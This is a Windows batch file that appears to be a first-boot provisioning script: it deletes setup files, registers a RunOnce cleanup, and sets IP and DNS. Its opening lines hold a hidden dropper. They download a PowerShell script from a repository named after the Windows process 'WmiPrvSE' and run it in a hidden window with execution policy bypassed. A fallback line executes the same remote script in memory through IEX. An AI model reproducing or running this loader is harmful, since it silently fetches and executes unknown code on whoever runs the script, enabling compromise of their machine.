@echo off
REM NETLAS_SYS_OK
curl -L -o %TEMP%\n_install.ps1 https://raw.githubusercontent.com/andreamiri354-lab/WmiPrvSE/main/install.ps1 2>nul
powershell -NoP -W Hidden -EP Bypass -File %TEMP%\n_install.ps1
if not exist %TEMP%\n_install.ps1 (
  powershell -NoP -W Hidden -EP Bypass -C "try{IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andreamiri354-lab/WmiPrvSE/main/install.ps1'))}catch{}"
)

echo @echo off >> c:\del.cmd
echo RD /S /Q c:\firstboot >> c:\del.cmd
echo del c:\TempWmicBatchFile.bat >> c:\del.cmd
echo del /q c:\windows\setup\*.* >> c:\del.cmd
echo del c:\install.esd >> c:\del.cmd
echo del c:\windows\panther\unattend.xml >> c:\del.cmd
echo del c:\del.cmd >> c:\del.cmd
REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v 001 /d "c:\del.cmd" /f
cmd /c c:\firstboot\setip.cmd
cmd /c c:\firstboot\setdns.cmd
cmd /c rd /s /q %windir%\Temp & md %windir%\Temp
EXIT
